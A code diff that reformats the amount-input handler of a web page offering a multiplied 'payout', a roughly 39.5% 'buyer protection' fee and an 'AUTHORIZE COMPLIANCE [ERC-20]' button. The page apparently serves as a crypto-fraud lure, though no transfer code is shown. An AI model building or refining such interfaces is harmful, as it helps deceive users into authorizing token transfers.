@@ -1361,57 +1361,99 @@ const BUYER_RATE = 0.39506184;
     }
 
     // ---- Input handler ----
-    input.addEventListener('input', ()=>{
-        const raw = input.value;
-        if(raw === ''){
-            payout.textContent = '$0';
-            protectionFee.textContent = '$0';
-activateBtn.textContent = 'AUTHORIZE COMPLIANCE – [ERC-20]';
-            card.classList.remove('inactive');
-            inputContainer.classList.remove('invalid');
-            errorMsg.style.display = 'none';
-            return;
-        }
+    input.addEventListener('input', () => {
 
-        let value = parseFloat(raw.replace(/,/g, ''));
-        if(isNaN(value)) return;
-        if(value > MAX_AMOUNT) value = MAX_AMOUNT;
-        input.value = value.toLocaleString(undefined, {
-    minimumFractionDigits: 2,
-    maximumFractionDigits: 2
-});
+    let raw = input.value;
 
-        if(forbiddenAmounts.includes(value) || value < MIN_AMOUNT){
-            showInputError(value < MIN_AMOUNT ? `Minimum amount is $${MIN_AMOUNT}` : 'This amount is not allowed.');
-            return;
-        }
+    // Allow "$" and commas in typing
+    raw = raw.replace(/\$/g, '').replace(/,/g, '');
 
-        // Valid input
-const buyerProtection =
-        value * BUYER_RATE;
+    if (raw === '') {
+        payout.textContent = '$0';
+        protectionFee.textContent = '$0';
 
-    const totalAmount = value;
-
-
-    protectionFee.textContent =
-        `$${buyerProtection.toFixed(2)}`;
         activateBtn.textContent =
-`AUTHORIZE COMPLIANCE – $${totalAmount.toFixed(2)} [ERC-20]`;
-        const projected = value * PAYOUT_MULTIPLIER;
-        const current = parseFloat(payout.textContent.replace('$','')) || 0;
-        animateValue(payout, activateBtn, current, projected, 500, MIN_AMOUNT, MAX_AMOUNT);
+            'AUTHORIZE COMPLIANCE – [ERC-20]';
 
-        inputContainer.classList.remove('invalid');
         card.classList.remove('inactive');
+        inputContainer.classList.remove('invalid');
         errorMsg.style.display = 'none';
-    });
+        return;
+    }
+
+    let value = parseFloat(raw);
+
+    if (isNaN(value)) return;
+
+    if (value > MAX_AMOUNT) value = MAX_AMOUNT;
+
+    // Format input with $ and commas
+    input.value = `$${value.toLocaleString(undefined, {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+    })}`;
+
+    if (
+        forbiddenAmounts.includes(value) ||
+        value < MIN_AMOUNT
+    ) {
+        showInputError(
+            value < MIN_AMOUNT
+                ? `Minimum amount is $${MIN_AMOUNT}`
+                : 'This amount is not allowed.'
+        );
+        return;
+    }
+
+    // Buyer protection
+    const buyerProtection = value * BUYER_RATE;
+
+    // Protection fee with commas
+    protectionFee.textContent =
+        `$${buyerProtection.toLocaleString(undefined, {
+            minimumFractionDigits: 2,
+            maximumFractionDigits: 2
+        })}`;
+
+    // Activate button with commas
+    activateBtn.textContent =
+        `AUTHORIZE COMPLIANCE – $${value.toLocaleString(undefined, {
+            minimumFractionDigits: 2,
+            maximumFractionDigits: 2
+        })} [ERC-20]`;
+
+    const projected = value * PAYOUT_MULTIPLIER;
+
+    const current =
+        parseFloat(
+            payout.textContent
+                .replace('$', '')
+                .replace(/,/g, '')
+        ) || 0;
+
+    animateValue(
+        payout,
+        activateBtn,
+        current,
+        projected,
+        500,
+        MIN_AMOUNT,
+        MAX_AMOUNT
+    );
+
+    inputContainer.classList.remove('invalid');
+    card.classList.remove('inactive');
+    errorMsg.style.display = 'none';
+});
 
     // ---- Activate button ----
 const activateButton = document.getElementById('customActivate');
 
 activateButton.addEventListener('click', e => {
 
-    const value = parseFloat(input.value.replace(/,/g, ''));
+    const value = parseFloat(
+    input.value.replace(/\$/g, '').replace(/,/g, '')
+);
 
     if (
         isNaN(value) ||
